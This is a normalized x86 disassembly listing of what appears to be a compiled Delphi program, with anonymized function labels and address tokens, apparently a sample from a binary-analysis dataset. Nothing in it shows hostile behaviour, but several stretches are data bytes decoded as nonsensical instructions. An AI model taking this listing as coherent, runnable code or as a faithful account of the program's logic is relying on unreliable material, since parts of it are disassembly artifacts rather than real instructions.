mov edx edi
call sub_404e98
jmp r-xdata
mov al 0x1
mov eax edi
call sub_405120
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47328f
lea eax [ ebp - 0x38 ]
mov edx 0xb
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_40512c
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_405120
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_405384
mov eax [ ebp - 0x14 ]
mov edx esi
call sub_405270
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
mov edx esi
call sub_405270
je r-xdata
mov edi 0x1
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40512c
mov [ ebp - 0x9 ] al
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_404edc
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebx ]
call sub_405120
mov edx eax
mov eax [ ebx ]
mov ecx 0x1
call sub_405384
mov eax [ ebp - 0x38 ]
mov edx esi
call sub_405270
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_405120
cmp edi eax
jle r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
dec edi
test edx edx
je r-xdata
mov eax [ ebx ]
call sub_405120
mov edx eax
mov eax ebx
mov ecx 0x1
call sub_4053c4
call sub_403e2c
cmp edi [ edx - 0x4 ]
jb r-xdata
inc edi
movzx edx [ edx + edi - 0x1 ]
call sub_40502c
mov eax [ ebp - 0x18 ]
mov edx esi
call sub_405270
jne r-xdata
mov eax [ ebp - 0x4 ]
dec edi
test eax eax
je r-xdata
cmp edi 0x1
jne r-xdata
call sub_403e2c
cmp edi [ eax - 0x4 ]
jb r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebx ]
call sub_405120
mov edx eax
mov eax [ ebx ]
mov ecx 0x1
call sub_405384
mov eax [ ebp - 0x1c ]
mov edx esi
call sub_405270
je r-xdata
mov eax ebx
mov edx esi
call sub_404e98
jmp r-xdata
inc edi
cmp [ eax + edi - 0x1 ] 0x2e
jne r-xdata
add edi 0x1
jno r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
dec edi
test edx edx
je r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
dec edi
test edx edx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
call sub_405120
mov edx eax
mov eax [ ebx ]
mov ecx 0x1
call sub_405384
mov eax [ ebp - 0x24 ]
mov edx esi
call sub_405270
jne r-xdata
call sub_403e34
call sub_403e2c
cmp edi [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp edi [ edx - 0x4 ]
jb r-xdata
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
dec edi
test edx edx
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov ecx 0x2
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_405384
mov eax [ ebp - 0x28 ]
mov edx r-xdata
call sub_405270
jne r-xdata
inc edi
movzx edx [ edx + edi - 0x1 ]
call sub_40502c
mov edx [ ebp - 0x20 ]
mov eax ebx
call sub_40512c
jmp r-xdata
inc edi
movzx edx [ edx + edi - 0x1 ]
call sub_40502c
mov edx [ ebp - 0x34 ]
mov eax ebx
call sub_40512c
call sub_403e2c
cmp edi [ edx - 0x4 ]
jb r-xdata
mov eax [ ebx ]
call sub_405120
mov edx eax
mov eax ebx
mov ecx 0x1
call sub_4053c4
jmp r-xdata
inc edi
movzx edx [ edx + edi - 0x1 ]
call sub_40502c
mov edx [ ebp - 0x30 ]
mov eax ebx
call sub_40512c
jmp r-xdata
mov eax [ ebx ]
call sub_405120
test eax eax
jle r-xdata
add edi 0x1
jno r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx ]
call sub_405120
mov edx eax
mov eax [ ebx ]
mov ecx 0x1
call sub_405384
mov eax [ ebp - 0x2c ]
mov edx esi
call sub_405270
jne r-xdata
jmp r-xdata
call sub_403e34
mov eax [ ebx ]
call sub_405120
mov edx eax
mov eax ebx
mov ecx 0x1
call sub_4053c4
sub_4732b4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47332f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473336
retn
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_405af0
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_405af0
mov eax rw-data
mov edx [ r-xdata ]
call sub_406410
mov eax rw-data
mov edx [ r-xdata ]
call sub_406410
mov eax rw-data
call sub_404e44
sub_47333c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
xor eax [ edi ]
in al 0x33
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh cl
xor eax [ edi ]
and al 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
inc ebx
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add ah ah
cmp eax 0x6eac0047
inc ecx
add [ esi + ebp * 2 + 0x6dc80041 ] dh
inc ecx
add ah cl
jno r-xdata
jb r-xdata
add [ edx + esi * 2 + 0x72dc0041 ] ch
inc ecx
add ah dl
jb r-xdata
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc esp
popad
je r-xdata
in al 0x33
add [ ebp + edi + 0xe0047 ] cl
add [ eax ] al
add [ eax ] al
add al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x14004010 ] dh
add [ eax ] al
add [ eax + 0x18004010 ] dh
add [ eax ] al
add [ eax ] dl
push esp
dec ecx
inc esi
outsd
popad
add al bl
add [ eax + eax ] bl
add [ eax ] al
pop esp
inc esp
inc ecx
inc edi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
inc esi
outsd
jb r-xdata
inc esi
imul esp [ ebp + 0x6c ] 0x33e49064
inc eax
add [ eax ] bl
aas
inc eax
add [ eax + 0x73 ] bl
inc ecx
add [ esi + ebp * 2 + 0x6eb40041 ] ch
inc ecx
inc esp
popad
je r-xdata
add [ esp + ecx * 2 ] bl
je r-xdata
insb
jae r-xdata
add ah bl
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc esi
imul esp [ ebp + 0x6c ] 0x47338464
add [ eax ] dh
inc esp
inc ecx
add [ eax ] al
add [ ebx ] dl
dec ecx
dec ebp
jne r-xdata
mov ecx [ esi + 0x8 ]
je r-xdata
inc esi
jo r-xdata
inc esi
add [ eax + 0x7c00464c ] cl
xchg esp eax
sbb [ edi ] bh
add [ eax ] cl
xor al 0x47
add al ah
ja r-xdata
inc ecx
je r-xdata
dec [ ebx + 0x468d084e ]
or al 0xba
dec eax
inc edi
add al ch
jpo r-xdata
push eax
popad
jb r-xdata
inc ecx
add [ ebx + ecx * 2 + 0x4c1c0046 ] al
pop eax
xchg ebx eax
jb r-xdata
inc ebp
inc ecx
add [ eax ] al
add al dl
ja r-xdata
jo r-xdata
push sub_473623
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov [ esi + 0x30 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
stc
dec [ ebx - 0x5efe4d32 ]
sbb [ edi + eax * 2 ] dh
inc esi
outsd
jb r-xdata
cmp [ edi ] al
je r-xdata
inc esi
add [ ebx ] dl
dec ecx
dec ebp
add ah dl
ja r-xdata
add ah al
jae r-xdata
jb r-xdata
call sub_405170
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_473d34
inc esp
popad
je r-xdata
insd
add [ eax - 0x2fffb8c5 ] ah
cmp al 0x47
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x8004010 ] dh
add [ eax ] al
add [ eax + 0xc004010 ] dh
add [ eax ] al
add al dl
aaa
inc esi
add [ eax ] bl
add [ eax ] al
add [ edx ] bl
push esp
dec ecx
dec ebp
jne r-xdata
inc edi
inc ecx
inc esp
popad
je r-xdata
jne r-xdata
dec ebp
add [ esp + esi * 2 + 0x41 ] bl
add al bl
je r-xdata
aam 0x77
inc ecx
inc esi
outsd
jb r-xdata
lea eax [ esi + 0xc ]
mov edx r-xdata
push ebx
je r-xdata
add [ eax ] al
nop
and al 0x35
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x35 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x35 ] dh
inc edi
add [ eax + eax ] dh
je r-xdata
add [ ecx ] dl
push esp
dec ecx
inc esi
outsd
jb r-xdata
ja r-xdata
inc esp
popad
je r-xdata
add al ch
xor [ edi ] eax
add [ eax ] al
inc edi
popad
insd
lea eax [ eax ]
add [ eax + edi + 0x47 ] dh
add [ esp + edi + 0x47 ] dh
inc esi
add [ esp + edx * 4 + 0x41 ] bh
inc eax
add [ eax + 0x36 ] ch
inc edi
add ah dh
xchg edx eax
inc ecx
add [ eax + 0x4b ] dh
inc esi
add [ eax - 0x6d ] bl
inc esi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
add [ eax ] bl
aas
mov ah 0x41
inc eax
add ah bh
inc eax
outsd
jb r-xdata
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
cmp [ esi ] al
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc esp
popad
je r-xdata
ja r-xdata
add [ eax ] al
mov eax eax
xor al 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
xor eax 0x340047
inc esi
imul esp [ ebp + 0x6c ] 0xc08b7364
movsb [ edi ] [ esi ]
xor al 0x47
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
inc esi
outsd
jb r-xdata
inc eax
inc esp
popad
je r-xdata
inc esi
imul esp [ ebp + 0x6c ] 0x34647364
inc edi
sub_473590
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47361c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403f34
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x14 ] 0x0
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_47379c
mov edx [ ebp - 0x4 ]
lea eax [ esi + 0x8 ]
call sub_404e98
mov ecx [ esi + 0x8 ]
lea eax [ esi + 0xc ]
mov edx r-xdata
call sub_405170
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_473d34
mov [ esi + 0x30 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473623
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
add esp 0xfffffff0
call sub_404288
sub_473667
add [ ebx + 0x56 ] dl
call sub_404330
mov ebx edx
mov esi eax
lea edx [ esi + 0x30 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_47369c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47378c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4638f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4736f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x30 ]
call sub_473d28
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebx + 0x18 ]
mov edx [ ebp - 0x4 ]
call sub_404e98
lea eax [ ebx + 0x10 ]
mov edx edi
call sub_404e98
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x1c ] eax
mov [ ebx + 0x20 ] 0x1
mov eax [ ebp + 0x8 ]
call sub_405120
test eax eax
jle r-xdata
lea edx [ ebp - 0xc ]
mov eax edi
call sub_470af0
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x14 ]
call sub_404e98
lea eax [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_404e98
jmp r-xdata
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473793
lea eax [ ebp - 0xc ]
call sub_404e44
retn
call sub_403e34
mov eax ebx
call sub_473f9c
cdq
add eax [ esi + 0x28 ]
adc edx [ esi + 0x2c ]
jno r-xdata
sub_47379c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx edx
xor eax eax
push ebp
push sub_4737fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ r-xdata ]
call sub_4626ec
add esp 0xfffffff8
fstp [ esp ]
fwait
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax [ r-xdata ]
call sub_462700
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edx r-xdata
call sub_405170
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473801
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_473834
push ebx
push esi
mov esi edx
mov ebx eax
push r-xdata
push [ ebx + 0x8 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x4
call sub_4051e4
pop esi
pop ebx
retn
sub_47386b
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_473b7f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebx + 0x14 ] 0x1
xor eax eax
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x18 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
cmp edi [ ebp + 0x8 ]
jge r-xdata
mov ebx edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473b86
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404e68
retn
mov eax [ ebx + 0x30 ]
call sub_417514
cmp eax [ ebx + 0x10 ]
jg r-xdata
mov eax [ ebx + 0x18 ]
call sub_406248
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
call sub_406248
test eax eax
jg r-xdata
mov eax [ ebx + 0x18 ]
call sub_406248
test eax eax
jle r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x18 ]
call sub_406248
mov edx [ ebp + 0x8 ]
sub edx [ ebp - 0x8 ]
jno r-xdata
mov edx [ ebx + 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_473d78
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_473e24
mov edx [ ebp - 0x14 ]
lea eax [ ebx + 0x18 ]
or ecx 0xffffffff
call sub_464cb4
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
call sub_417514
cmp eax [ ebx + 0x10 ]
jne r-xdata
cmp edi [ ebp + 0x8 ]
jge r-xdata
cmp eax edx
jle r-xdata
call sub_403e34
add [ ebx + 0x10 ] 0x1
jno r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x1c ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_473834
mov edx [ ebp - 0x1c ]
lea eax [ ebx + 0x18 ]
or ecx 0xffffffff
call sub_464cb4
add [ ebx + 0x10 ] 0x1
jno r-xdata
mov eax [ ebp + 0x8 ]
sub eax edi
jno r-xdata
mov eax [ ebx + 0x18 ]
call sub_406248
mov esi eax
mov esi [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
jno r-xdata
call sub_403e34
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x1c ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x1c ]
mov [ ebx + 0x4 ] eax
push 0x0
push 0x0
mov eax [ ebx + 0x4 ]
call sub_4192e0
jmp r-xdata
call sub_403e34
push eax
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ r-xdata ]
call sub_463544
mov esi eax
mov eax [ ebp + 0x8 ]
sub eax edi
jno r-xdata
call sub_403e34
mov eax [ ebx + 0x18 ]
call sub_406248
sub eax esi
jno r-xdata
jmp r-xdata
call sub_403e34
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx [ ebp - 0x18 ]
lea eax [ ebx + 0x18 ]
or ecx 0xffffffff
call sub_464cb4
add [ ebx + 0x10 ] 0x1
jno r-xdata
cmp esi eax
jge r-xdata
call sub_403e34
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax [ ebx + 0x18 ]
call sub_463a00
cmp [ ebp - 0xc ] 0x0
jle r-xdata
call sub_403e34
test esi esi
jle r-xdata
jmp r-xdata
call sub_403e34
add [ ebp - 0x8 ] esi
jno r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x4 ]
call sub_4192e0
xor eax eax
mov [ ebx + 0x4 ] eax
add [ ebx + 0x10 ] 0x1
jno r-xdata
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebx + 0x18 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
add [ ebp - 0x8 ] esi
jno r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
lea ecx [ ebx + 0x18 ]
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_463a00
add edi esi
jno r-xdata
call sub_403e34
push 0x0
lea eax [ ebx + 0x18 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
lea eax [ ebx + 0x18 ]
or ecx 0xffffffff
mov edx r-xdata
call sub_464cb4
call sub_403e34
mov eax esi
cdq
add eax [ ebx + 0x20 ]
adc edx [ ebx + 0x24 ]
jno r-xdata
call sub_403e34
mov eax esi
cdq
add eax [ ebx + 0x20 ]
adc edx [ ebx + 0x24 ]
jno r-xdata
call sub_403e34
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x24 ] edx
add edi esi
jno r-xdata
call sub_403e34
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x24 ] edx
call sub_403e34
call sub_403e34
sub_473b97
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_473c5d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
sub dl 0x1
jb r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
je r-xdata
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
dec dl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473c64
lea eax [ ebp - 0xc ]
call sub_404e44
retn
mov [ ebx + 0x14 ] 0x0
mov [ ebx + 0x20 ] 0x0
mov [ ebx + 0x24 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_473834
mov eax [ ebp - 0xc ]
call sub_405120
cdq
add eax [ ebx + 0x28 ]
adc edx [ ebx + 0x2c ]
jno r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
call sub_403e34
sub_473c74
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_473cbf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473cc6
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_473cd0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_473d1a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473d21
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_473d34
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_41730c
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_473d8c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_417128
xor eax eax
mov [ esi + 0x1c ] eax
lea eax [ esi + 0x10 ]
call sub_404e44
lea eax [ esi + 0x18 ]
call sub_404e44
lea eax [ esi + 0x14 ]
call sub_404e44
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_473de4
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417160
test bl bl
jle r-xdata
cmp [ esi + 0x20 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
lea edx [ esi + 0x1c ]
mov eax [ r-xdata ]
call sub_462560
sub_473e24
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_473eee
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x18 ]
mov edx [ edx + 0x8 ]
call sub_404edc
cmp [ ebx + 0x1c ] 0x0
je r-xdata
push 0x2
push esi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] 0xb
mov eax [ ebx + 0x18 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0xb
mov eax [ ebx + 0xc ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0xb
lea ecx [ ebp - 0x3c ]
mov edx r-xdata
mov eax [ r-xdata ]
call sub_4624e8
mov eax [ ebx + 0x10 ]
call sub_405120
test eax eax
jle r-xdata
push 0x3
push esi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0xb
mov eax [ ebx + 0x18 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
mov eax [ ebx + 0x14 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea ecx [ ebp - 0x24 ]
mov edx r-xdata
mov eax [ r-xdata ]
call sub_4624e8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473ef5
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_473f9c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_474072
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_473e24
mov eax [ ebp - 0x4 ]
call sub_405120
mov esi eax
mov edi [ ebx + 0x1c ]
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474079
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
mov eax edi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_405120
add esi eax
jno r-xdata
mov eax edi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
jno r-xdata
add esi 0x2
jno r-xdata
call sub_403e34
add esp 0x8
add eax 0x2
adc edx 0x0
jno r-xdata
call sub_403e34
jmp r-xdata
call sub_403e34
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
call sub_403e34
mov esi eax
call sub_403e2c
sub_474088
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x41
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 ] cl
inc edi
add [ eax + eax ] bh
add [ eax ] al
push 0xe800464f
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add ah dh
inc ecx
inc edi
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add al cl
insd
inc ecx
add ah al
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
dec edi
inc esi
add [ esi ] al
add [ eax ] dl
dec ecx
inc ecx
outsb
je r-xdata
add [ eax + 0x50 ] dh
inc esi
add [ edx + eax * 2 + 0x47 ] ah
add [ eax - 0x17ffbfce ] dl
inc edx
inc edi
add [ ecx ] dl
push esp
dec ecx
inc ecx
outsb
je r-xdata
inc [ ecx ]
inc esi
jb r-xdata
xor [ eax ] eax
inc esi
jb r-xdata
cmp [ esp ] 0x0
je r-xdata
push 0x64496e65
insb
add al 0x0
or ecx [ ecx + 0x64 ]
insb
push esp
imul ebp [ ebp + 0x65 ] 0x74754f
adc [ eax ] al
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e4f0c00
insb
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xfa ] al
jpe r-xdata
mov eax esi
movsd [ edi ] [ esi ]
dec edx
add [ ebx - 0x31d7f2d ] cl
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
add eax [ eax ]
push ss
inc ecx
jo r-xdata
push [ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jpe r-xdata
pop edx
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
